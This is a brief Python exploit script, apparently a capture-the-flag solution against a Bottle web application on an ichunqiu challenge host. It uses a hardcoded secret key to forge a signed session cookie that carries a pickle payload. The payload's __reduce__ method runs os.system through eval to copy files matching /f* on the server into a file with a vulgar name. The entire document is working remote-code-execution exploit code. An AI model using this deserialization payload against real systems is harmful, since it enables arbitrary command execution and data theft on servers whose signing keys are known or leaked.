from bottle import cookie_encode
import os
import requests
secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"

class Test:
    def __reduce__(self):
        return (eval, ("""__import__('os').system('cp /f* ./wocaonimadewozhendeshifule.txt')""",))

exp = cookie_encode(
    ('session', {"name": [Test()]}),
    secret
)

requests.get('http://eci-2ze5ykme8wqk9cryya1n.cloudeci1.ichunqiu.com:5000/secret', cookies={'name': exp.decode()})

